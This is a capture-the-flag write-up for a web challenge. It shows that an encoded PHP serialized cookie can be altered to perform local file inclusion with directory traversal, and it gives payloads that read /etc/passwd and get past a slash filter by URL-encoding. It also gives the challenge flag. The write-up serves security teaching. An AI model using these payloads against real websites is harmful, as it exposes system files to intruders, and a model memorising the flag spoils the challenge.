# Serial Killer

## Description

I'm trying a new way to display files on my website. Can you try to break it for me?

Note: The flag is located in the /etc/passwd file.

## Solution

There is a cookie set when the page is loaded. When that cookie is decoded there is an LFI in that serialized cookie.
```
Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D
O:7:"GetPage":1:{s:4:"file";s:10:"index.html";}
```

We can use directory taversal to get back to root and then get `/etc/passwd`.
```
O:7:"GetPage":1:{s:4:"file";s:19:"../../../etc/passwd";}
```

Trying this causes a filter to trigger. To bypass the filter the `/` characters can be encoded to `%2f`.
```
O:7:"GetPage":1:{s:4:"file";s:25:"..%2f..%2f..%2fetc/passwd";}
```

This works to get access to `/etc/passwd` and the flag inside.

Flag: `gigem{1nt3r3sting_LFI_vuln}`
